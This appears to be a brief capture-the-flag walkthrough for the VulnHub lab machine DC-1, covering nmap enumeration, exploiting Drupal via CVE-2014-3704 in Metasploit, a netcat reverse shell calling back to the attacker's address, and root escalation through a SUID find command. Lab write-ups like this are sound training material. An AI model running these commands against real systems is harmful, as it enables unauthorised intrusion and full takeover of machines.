# [Machine](https://www.vulnhub.com/entry/dc-1,292/)

- # ENUM
	- ### nmap (`nmap -sV -A -p- -T4 DC-1`)
		- ```PORT      STATE SERVICE VERSION
			22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
			| ssh-hostkey: 
			|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
			|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
			|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
			80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
			|_http-server-header: Apache/2.2.22 (Debian)
			|_http-title: Welcome to Drupal Site | Drupal Site
			| http-robots.txt: 36 disallowed entries (15 shown)
			| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
			| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
			| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
			|_/LICENSE.txt /MAINTAINERS.txt
			|_http-generator: Drupal 7 (http://drupal.org)
			111/tcp   open  rpcbind 2-4 (RPC #100000)
			| rpcinfo: 
			|   program version    port/proto  service
			|   100000  2,3,4        111/tcp   rpcbind
			|   100000  2,3,4        111/udp   rpcbind
			|   100000  3,4          111/tcp6  rpcbind
			|   100000  3,4          111/udp6  rpcbind
			|   100024  1          48942/udp6  status
			|   100024  1          51029/udp   status
			|   100024  1          54730/tcp6  status
			|_  100024  1          54968/tcp   status
			54968/tcp open  status  1 (RPC #100024)
			Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```

- # EXPLOITATION
	- Run metasploit (`msfconsole`)
		- Use `CVE-2014-3704` to open a Reverse Shell
		- Open a netcat (`nc -lvnp 4444` on our machine, `nc 192.168.1.144 4444 -e /bin/sh` on the victim)

- # PRIV ESC
	- Run `linpeas.sh`
		- `/usr/bin/find` running as root!
			- Check on GTFOBins:
				- `/usr/bin/find . -exec /bin/sh \; -quit`
					- We're root!